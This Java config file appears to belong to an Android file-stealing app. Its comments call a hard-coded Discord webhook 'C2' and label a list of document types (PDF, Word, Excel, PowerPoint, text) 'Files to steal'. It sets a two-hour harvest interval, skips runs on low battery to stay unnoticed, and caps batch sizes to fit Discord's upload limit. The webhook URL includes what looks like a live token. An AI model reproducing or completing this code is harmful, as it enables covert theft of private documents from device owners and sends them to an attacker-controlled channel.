package com.example.harvester;

public class Config {
    // ===== C2: paste your Discord webhook URL here =====
    public static final String DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1539251824912109568/VnLqwavg5WUXiNXGSUV9C-eDdVN85HmlTQrT20NBrx0PTPMgrpbg2IEUZmEXOpkJd8UK";

    // ===== Timing =====
    public static final long INTERVAL_HOURS = 2;      // harvest every 2h (Android makes it ~2-3h)
    public static final int  MIN_BATTERY_PCT = 25;    // skip if battery below 25%

    // ===== Batch limits (protects battery, stays under Discord's 25MB) =====
    public static final int  MAX_FILES = 60;
    public static final long MAX_BYTES_PER_FILE = 20L * 1024 * 1024;
    public static final long MAX_MB_PER_CYCLE  = 20L * 1024 * 1024;

    // ===== Files to steal =====
    public static final String[] DOC_MIMES = {
        "application/pdf",
        "application/msword",
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        "application/vnd.ms-excel",
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        "application/vnd.ms-powerpoint",
        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        "text/plain"
    };
}
